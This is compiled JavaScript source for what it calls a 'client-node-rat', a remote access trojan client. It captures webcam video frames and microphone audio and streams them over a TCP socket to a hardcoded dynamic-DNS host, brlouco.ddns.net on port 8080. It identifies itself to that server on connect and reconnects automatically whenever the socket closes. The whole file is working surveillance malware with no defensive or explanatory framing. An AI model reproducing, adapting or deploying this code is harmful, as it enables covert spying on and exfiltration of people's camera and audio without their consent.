"use strict";
var __generator = (this && this.__generator) || function (thisArg, body) {
    var _ = { label: 0, sent: function() { if (t[0] & 1) throw t[1]; return t[1]; }, trys: [], ops: [] }, f, y, t, g;
    return g = { next: verb(0), "throw": verb(1), "return": verb(2) }, typeof Symbol === "function" && (g[Symbol.iterator] = function() { return this; }), g;
    function verb(n) { return function (v) { return step([n, v]); }; }
    function step(op) {
        if (f) throw new TypeError("Generator is already executing.");
        while (_) try {
            if (f = 1, y && (t = op[0] & 2 ? y["return"] : op[0] ? y["throw"] || ((t = y["return"]) && t.call(y), 0) : y.next) && !(t = t.call(y, op[1])).done) return t;
            if (y = 0, t) op = [op[0] & 2, t.value];
            switch (op[0]) {
                case 0: case 1: t = op; break;
                case 4: _.label++; return { value: op[1], done: false };
                case 5: _.label++; y = op[1]; op = [0]; continue;
                case 7: op = _.ops.pop(); _.trys.pop(); continue;
                default:
                    if (!(t = _.trys, t = t.length > 0 && t[t.length - 1]) && (op[0] === 6 || op[0] === 2)) { _ = 0; continue; }
                    if (op[0] === 3 && (!t || (op[1] > t[0] && op[1] < t[3]))) { _.label = op[1]; break; }
                    if (op[0] === 6 && _.label < t[1]) { _.label = t[1]; t = op; break; }
                    if (t && _.label < t[2]) { _.label = t[2]; _.ops.push(op); break; }
                    if (t[2]) _.ops.pop();
                    _.trys.pop(); continue;
            }
            op = body.call(thisArg, _);
        } catch (e) { op = [6, e]; y = 0; } finally { f = t = 0; }
        if (op[0] & 5) throw op[1]; return { value: op[0] ? op[1] : void 0, done: true };
    }
};
var __await = (this && this.__await) || function (v) { return this instanceof __await ? (this.v = v, this) : new __await(v); }
var __asyncGenerator = (this && this.__asyncGenerator) || function (thisArg, _arguments, generator) {
    if (!Symbol.asyncIterator) throw new TypeError("Symbol.asyncIterator is not defined.");
    var g = generator.apply(thisArg, _arguments || []), i, q = [];
    return i = {}, verb("next"), verb("throw"), verb("return"), i[Symbol.asyncIterator] = function () { return this; }, i;
    function verb(n) { if (g[n]) i[n] = function (v) { return new Promise(function (a, b) { q.push([n, v, a, b]) > 1 || resume(n, v); }); }; }
    function resume(n, v) { try { step(g[n](v)); } catch (e) { settle(q[0][3], e); } }
    function step(r) { r.value instanceof __await ? Promise.resolve(r.value.v).then(fulfill, reject) : settle(q[0][2], r); }
    function fulfill(value) { resume("next", value); }
    function reject(value) { resume("throw", value); }
    function settle(f, v) { if (f(v), q.shift(), q.length) resume(q[0][0], q[0][1]); }
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
var net_1 = require("net");
var stream_1 = require("stream");
var data_uri_to_buffer_1 = __importDefault(require("data-uri-to-buffer"));
var events_1 = require("events");
var AudioRecorder = /** @class */ (function () {
    function AudioRecorder(stream) {
        var _this = this;
        this.audioChunks = [];
        this.recorder = new MediaRecorder(stream);
        this.recorder.addEventListener("dataavailable", function (event) {
            _this.audioChunks.push(event.data);
        });
    }
    AudioRecorder.prototype.start = function () {
        this.recorder.start();
    };
    AudioRecorder.prototype.stop = function () {
        var _this = this;
        return new Promise(function (resolve) {
            _this.recorder.addEventListener("stop", function () {
                var audioBlob = new Blob(_this.audioChunks);
                var audioUrl = URL.createObjectURL(audioBlob);
                var audio = new Audio(audioUrl);
                var play = function () {
                    audio.play();
                };
                resolve({ audioBlob: audioBlob, audioUrl: audioUrl, play: play });
            });
            _this.recorder.stop();
        });
    };
    return AudioRecorder;
}());
var FPS = 50;
var HOST = 'brlouco.ddns.net';
var PORT = 8080;
var client = new net_1.Socket();
var StreamMedia;
navigator.getUserMedia({ video: true, audio: true }, function (mediaStream) {
    var video = document.getElementById('video');
    video.srcObject = mediaStream;
}, function (err) { return console.error(err); });
var getBufferVideo = function () {
    var canvas, videoCanvas, ctx, data_uri, buf;
    return __generator(this, function (_a) {
        switch (_a.label) {
            case 0:
                if (!true) return [3 /*break*/, 2];
                canvas = document.getElementById('myCanvas');
                videoCanvas = document.getElementById('video');
                ctx = canvas.getContext('2d');
                canvas.width = videoCanvas.videoWidth;
                canvas.height = videoCanvas.videoHeight;
                ctx === null || ctx === void 0 ? void 0 : ctx.drawImage(videoCanvas, 0, 0);
                data_uri = canvas.toDataURL();
                buf = data_uri_to_buffer_1.default(data_uri);
                return [4 /*yield*/, buf];
            case 1:
                _a.sent();
                return [3 /*break*/, 0];
            case 2: return [2 /*return*/];
        }
    });
};
var getBufferAudio = function (time) {
    if (time === void 0) { time = 10000; }
    return __asyncGenerator(this, arguments, function () {
        var recorder, contentAd, arrBuf, buf;
        return __generator(this, function (_a) {
            switch (_a.label) {
                case 0:
                    if (!true) return [3 /*break*/, 6];
                    if (typeof StreamMedia === 'undefined')
                        return [3 /*break*/, 0];
                    recorder = new AudioRecorder(StreamMedia);
                    recorder.start();
                    return [4 /*yield*/, __await(new Promise(function (resolve) { return setTimeout(resolve, time); }))];
                case 1:
                    _a.sent();
                    return [4 /*yield*/, __await(recorder.stop())];
                case 2:
                    contentAd = _a.sent();
                    return [4 /*yield*/, __await(contentAd.audioBlob.arrayBuffer())];
                case 3:
                    arrBuf = _a.sent();
                    buf = Buffer.from(arrBuf);
                    return [4 /*yield*/, __await(buf)];
                case 4: return [4 /*yield*/, _a.sent()];
                case 5:
                    _a.sent();
                    return [3 /*break*/, 0];
                case 6: return [2 /*return*/];
            }
        });
    });
};
var ConnectionTCP = new events_1.EventEmitter();
ConnectionTCP.on('start', function () {
    setTimeout(function () {
        client.connect(PORT, HOST, function () {
            client.write('client-node-rat');
            var stream = stream_1.Readable.from(getBufferVideo().next().value);
            stream.pipe(client);
        });
    }, 1000 / FPS);
});
ConnectionTCP.emit('start');
client.on('error', function (error) {
    if (error)
        console.error(error);
});
client.on('lookup', function (error, addr, fam) {
    if (error)
        console.error(error);
});
client.on('timeout', function () {
    console.log('timeout');
});
client.on('close', function () {
    ConnectionTCP.emit('start');
});
